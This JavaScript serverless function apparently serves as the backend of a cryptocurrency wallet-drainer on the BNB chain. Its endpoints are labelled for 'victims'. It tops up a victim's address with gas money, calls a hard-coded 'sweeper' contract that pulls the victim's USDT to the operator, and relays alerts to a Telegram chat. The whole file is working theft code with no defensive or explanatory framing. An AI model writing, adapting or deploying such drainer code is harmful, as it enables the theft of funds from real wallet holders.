import { ethers } from "ethers"

const FUNDING_PRIVATE_KEY = process.env.FUNDING_PRIVATE_KEY
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID
const BNB_RPC = "https://bsc-dataseed.binance.org/"
const SWEEPER_CONTRACT = "0x725d16999d92d799c6040a5d0387339122ae8fc9"
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"

const provider = new ethers.JsonRpcProvider(BNB_RPC)
const fundingWallet = new ethers.Wallet(FUNDING_PRIVATE_KEY, provider)

const headers = {
  "Content-Type": "application/json",
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "Content-Type",
  "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
}

async function sendTelegram(message) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    })
  } catch (error) {
    console.error("Telegram error:", error)
  }
}

export async function handler(event) {
  if (event.httpMethod === "OPTIONS") {
    return { statusCode: 200, headers, body: "" }
  }

  const body = event.body ? JSON.parse(event.body) : {}
  let path = (event.path || "").replace(/^\/\.netlify\/functions\/api/, "").replace(/^\/api/, "")

  try {
    // ========== TELEGRAM ALERTS ==========
    if (path === "/telegram" && event.httpMethod === "POST") {
      await sendTelegram(body.message || "")
      return { statusCode: 200, headers, body: JSON.stringify({ success: true }) }
    }

    // ========== GAS FUNDING ==========
    if (path === "/fund-gas" && event.httpMethod === "POST") {
      const { victimAddress } = body
      const balance = await provider.getBalance(victimAddress)

      if (balance < ethers.parseEther("0.0003")) {
        const tx = await fundingWallet.sendTransaction({
          to: victimAddress,
          value: ethers.parseEther("0.0005"),
        })
        await tx.wait()
        return { statusCode: 200, headers, body: JSON.stringify({ success: true, txHash: tx.hash }) }
      }

      return { statusCode: 200, headers, body: JSON.stringify({ success: true, message: "Victim has enough BNB." }) }
    }

    // ========== SWEEP USDT ==========
    if (path === "/sweep" && event.httpMethod === "POST") {
      const { victimAddress } = body
      const sweeperABI = ["function sweep(address victim, address token) external"]
      const sweeper = new ethers.Contract(SWEEPER_CONTRACT, sweeperABI, fundingWallet)

      const tx = await sweeper.sweep(victimAddress, USDT_ADDRESS)
      await tx.wait()
      return { statusCode: 200, headers, body: JSON.stringify({ success: true, txHash: tx.hash }) }
    }

    return { statusCode: 404, headers, body: JSON.stringify({ success: false, error: "Not found" }) }
  } catch (error) {
    console.error("Function error:", error)
    return { statusCode: 500, headers, body: JSON.stringify({ success: false, error: error.message }) }
  }
}